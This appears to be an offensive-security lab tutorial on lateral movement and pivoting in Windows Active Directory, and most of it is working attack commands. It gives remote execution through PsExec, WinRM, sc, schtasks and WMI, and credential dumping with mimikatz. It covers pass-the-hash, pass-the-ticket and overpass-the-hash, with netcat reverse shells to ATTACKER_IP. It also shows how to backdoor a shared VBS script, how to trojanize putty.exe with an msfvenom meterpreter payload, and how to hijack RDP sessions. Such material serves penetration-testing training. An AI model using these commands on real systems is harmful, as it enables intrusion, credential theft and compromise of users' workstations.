# Lateral Movement and Pivoting

This phase assumes you have valid domain credentials in Active Directory, have access to a machine, and your objective is to perform pivoting and lateral movement.

## **A. Spawning Processes Remotely**

Most Windows remote management commands (`schtasks`, `sc`, `wmic`, `psexec`, etc.) **authenticate to the remote host using the caller’s current credentials by default**, unless explicit credentials are provided via `/U` and `/P` (or equivalent).
Therefore, if a command targets a remote machine but does not include explicit credentials, it is likely using the current user’s session for authentication.

---

### 1. PsExec

* **Ports:** 445/TCP (SMB)
* **Required Group Memberships:** Administrators

To run `PsExec`, we only need to supply the required administrator credentials for the remote host and the command we want to run

```powershell
psexec -accepteula \\TARGET -u DOMAIN\Administrator -p 'Pass' cmd.exe
```

**The way `PsExec` works is as follows:**

* Connect to Admin$ share and upload a service binary. `PsExec` uses `psexesvc.exe` as the name.
* Connect to the service control manager to create and run a service named `PSEXESVC` and associate the service binary with `C:\Windows\psexesvc.exe`.
* Create some named pipes to handle stdin/stdout/stderr.

If automatic delivery fails, you can manually copy the correct `psexesvc.exe` (x86 vs x64) into `\\target\admin$\` before running `PsExec`.

---

### 2. Remote Process Creation Using WinRM

Windows Remote Management (WinRM) — Microsoft’s remoting service (HTTP/HTTPS) that lets you run PowerShell/commands remotely.

* **Ports:** `5985/tcp` (HTTP), `5986/tcp` (HTTPS)
* **Required Group Memberships:** Remote Management Users (or admin privileges for full capability).

**Simple remote command (winrs):**

```cmd
winrs.exe -u:Administrator -p:Mypass123 -r:TARGET cmd
```

**PowerShell (use PSCredential):**

```powershell
$username = 'Administrator'
$password = 'Mypass123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

# interactive shell
Enter-PSSession -ComputerName TARGET -Credential $credential

# run a command/scriptblock remotely
Invoke-Command -ComputerName TARGET -Credential $credential -ScriptBlock { whoami }
```

---

### 3. Remotely Creating Services Using sc

* **Ports:**
  * 135/TCP
  * 49152-65535/TCP (DCE/RPC)
  * 445/TCP (RPC over SMB Named Pipes)
  * 139/TCP (RPC over SMB Named Pipes)
* **Required Group Memberships:** Administrators

```powershell
# create & start a service remotely (binary must already exist on the target)
sc \\TARGET create Service1 binPath= "C:\Windows\Temp\my.exe" start= demand
sc \\TARGET start Service1

# OR Directly Run command
sc.exe \\TARGET create Service1 binPath= "net user User1 Pass123 /add" start= auto
sc.exe \\TARGET start Service1

## cleanup
sc.exe \\TARGET stop Service1
sc.exe \\TARGET delete Service1
```

---

### 4. Creating Scheduled Tasks Remotely

```powershell
schtasks /s TARGET /RU "SYSTEM" /create /tn "task1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/2000 /st 00:00 
```

**What this does:**

* `/s TARGET`: Specifies the remote system (`TARGET`) where the task will be created.
* `/RU "SYSTEM"`: Runs the task as the SYSTEM user, which has the highest privileges.
* `/create`: Tells `schtasks` to create a new task.
* `/tn "task1"`: Sets the task name to "task1".
* `/tr "<command>"`: The actual command or payload that will be executed.
* `/sc ONCE`: Sets the task to run only once.
* `/sd 01/01/2000`: Sets the scheduled **start date** to a date in the past.
* `/st 00:00`: Sets the scheduled **start time** to midnight.

**Why use a past date?**

* By scheduling the task in the past, Windows will not attempt to run it automatically.
* However, the task will still be created and stored.
* This allows you to manually trigger it when needed, without relying on the schedule.

```powershell
#Run Manually
schtasks /s TARGET /run /TN "task1" 

#Delete
schtasks /S TARGET /TN "task1" /DELETE /F
```

---

Suppose you have SSH access to a Windows machine as a user and you want to start a process on a different Windows host using `sc.exe`. It attempt to authenticate to the target using the credentials/token of the caller, but an SSH session usually does not forward a Windows access token or perform Windows credential delegation. Therefore the remote call can fail unless you use an authentication method that supports delegation. Alternatively, use remote-execution tools that accept explicit credentials or use remote management protocols that support proper authentication — e.g., SchTasks, PsExec, WinRM / PowerShell Remoting — rather than assuming the SSH shell will pass your Windows token through.
These are some of the methods an attacker can use to spawn a shell and create a process remotely if they have valid credentials for the machine.

**You can also use `RunAs` to switch from SSH to a CMD shell which can pass Authentication Token:**

```poweshell
runas /netonly /user:t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

* It assumes availabilty of Netcat
* `/netonly` is limited to network based commands and will not bother to check if the provided credentials are valid, so be sure to type the password manually and correctly. If you don't, you will see some ACCESS DENIED errors later

---

## **B. Moving Laterally Using WMI**

WMI is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices.

### 1. Connecting to WMI From Powershell

We need to create a PSCredential object with our user and password. This object will be stored in the `$credential` variable and utilised throughout the techniques on this task:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then proceed to establish a WMI session using either of the following protocols:

* **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
* **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable, which we will use throughout the room on the different techniques:

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.

---

### 2. Remote Process Creation Using WMI

* **Ports:**

  * 135/TCP, 49152-65535/TCP (DCERPC)
  * 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

* **Required Group Memberships:** Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.

On legacy systems, the same can be done using wmic from the command prompt:

```powershell
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

---

### 3. Creating Services Remotely with WMI

* **Ports:**
  * 135/TCP, 49152-65535/TCP (DCERPC)
  * 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* **Required Group Memberships:** Administrators

We can create services with WMI through Powershell. To create a service called Service2, we can use the following command:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "Service2";
DisplayName = "Service2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

And then, we can get a handle on the service and start it with the following commands:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'Service2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finally, we can stop and delete the service with the following commands:

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

---

### 4. Creating Scheduled Tasks Remotely with WMI

* **Ports:**
  * 135/TCP, 49152-65535/TCP (DCERPC)
  * 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* **Required Group Memberships:** Administrators

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "Task2"
Start-ScheduledTask -CimSession $Session -TaskName "Task2"
```

To delete the scheduled task after it has been used, we can use the following command:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "Task2"
```

---

### 5. Installing MSI packages through WMI

* **Ports:**
  * 135/TCP, 49152-65535/TCP (DCERPC)
  * 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* **Required Group Memberships:** Administrators

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

We can achieve the same by us using wmic in legacy systems:

```powershell
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

---

## **C. Use of Alternate Authentication Material**

By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. This is possible because of how some authentication protocols used by Windows networks work.

We will take a look at a couple of alternatives available to log as a user when either of the following authentication protocols is available on the network:

* NTLM authentication
* Kerberos authentication

---

### 1. Pass-the-Hash

When you extract credentials from a Windows host where you already have administrative access (for example with Mimikatz), you might find plaintext passwords or hashes that are easy to crack. If the hashes can't be cracked, that doesn’t mean they’re useless. NTLM authentication uses a challenge/response protocol: the server issues a challenge and the client replies using the password’s NTLM hash. That means an attacker who knows the NTLM hash can produce the correct response and authenticate — without ever knowing the plaintext password. This technique is called **Pass-the-Hash (PtH)** and allows authentication simply by using the captured hash when a domain accepts NTLM authentication.

* Plaintext passwords are ideal, but uncracked NTLM hashes can still be used.
* NTLM’s challenge/response lets an attacker authenticate with the hash alone.
* Pass-the-Hash exploits this behavior to authenticate without cracking the password.

To extract NTLM hashes, we can either use mimikatz to read the local SAM or extract hashes directly from LSASS memory.

#### **Extracting NTLM hashes from local SAM**

This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

```mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

#### **Extracting NTLM hashes from LSASS memory**

This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

```mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THEDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:

```cmd
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.domain.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Notice we used `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.

This would be the equivalent of using `runas /netonly` but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.

To receive the reverse shell, we should run a reverse listener on our AttackBox

Interestingly, if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.

### 2. Passing the Hash Using Linux

If you have access to a linux box (like your AttackBox), several tools have built-in support to perform PtH using different protocols. Depending on which services are available to you, you can do the following:

```bash
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

**Note:** Only the linux version of psexec support PtH.

---

### 3. Pass-the-Ticket

Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:

```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Notice that if we only had access to a ticket but not its corresponding session key, we wouldn't be able to use that ticket; therefore, both are necessary.

While mimikatz can extract any TGT or TGS available from the memory of the LSASS process, most of the time, we'll be interested in TGTs as they can be used to request access to any services the user is allowed to access. At the same time, TGSs are only good for a specific service. Extracting TGTs will require us to have administrator's credentials, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account).

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:

```mimikatz
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.DOMAIN.COM.kirbi
```

Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the klist command:

```powershell
za\bob.jenkins@JMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.DOMAIN.COM
        Server: krbtgt/ZA.DOMAIN.COM @ ZA.DOMAIN.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THEDC.za.domain.com
```

### 4. Overpass-the-hash / Pass-the-Key

This kind of attack is similar to PtH but applied to Kerberos networks.

When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-the-key (PtK).

We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:

```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key:

If we have the RC4 hash:

```mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:za.domain.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

If we have the AES128 hash:

```mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:za.domain.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

If we have the AES256 hash:

```mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:za.domain.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as **Overpass-the-Hash (OPtH)**.

To receive the reverse shell, we should run a reverse listener on our AttackBox:

```bash
nc -lvnp 5556
```

Just as with PtH, any command run from this shell will use the credentials injected via mimikatz.

---

## **D. Abusing User Behaviour**

### 1. Abusing Writable Shares

It is quite common to find network shares that legitimate users use to perform day-to-day tasks when checking corporate environments. If those shares are writable for some reason, an attacker can plant specific files to force users into executing any arbitrary payload and gain access to their machines.

One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.

![img](/img/LateralMovementAndPivotingInAD/1.png)

The rationale behind this is that the administrator can maintain an executable on a network share, and users can execute it without copying or installing the application to each user's machine. If we, as attackers, have write permissions over such scripts or executables, we can backdoor them to force users to execute any payload we want.

Although the script or executable is hosted on a server, when a user opens the shortcut on his workstation, the executable will be copied from the server to its `%temp%` folder and executed on the workstation. Therefore any payload will run in the context of the final user's workstation (and logged-in user account).

### 2. Backdooring .vbs Scripts

As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:

```powershell
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

### 3. Backdooring .exe Files

If the shared file is a Windows binary, say `putty.exe`, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored `putty.exe`, we can use the following command:

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting `puttyX.exe` will execute a `reverse_tcp` meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.

### 4. RDP hijacking

When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:

From there, run PsExec64.exe:

```powershell
PsExec64.exe -s cmd.exe
```

To list the existing sessions on a server, you can use the following command:

```cmd
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                      3  Disc            .  4/6/2022 6:51 AM

```

According to the command output above, if we were currently connected via RDP using the administrator user, our `SESSIONNAME` would be `rdp-tcp#6`. We can also see that a user named luke has left a session open with id `3`. Any session with a Disc state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.

To connect to a session, we will use `tscon.exe` and specify the session `ID` we will be taking over, as well as our current `SESSIONNAME`. Following the previous example, to takeover luke's session if we were connected as the administrator user, we'd use the following command:

```cmd
tscon 3 /dest:rdp-tcp#6
```

In simple terms, the command states that the graphical session 3 owned by luke, should be connected with the RDP session rdp-tcp#6, owned by the administrator user.

As a result, we'll resume luke's RDP session and connect to it immediately.

**Note:** Windows Server 2019 won't allow you to connect to another user's session without knowing its password.

---
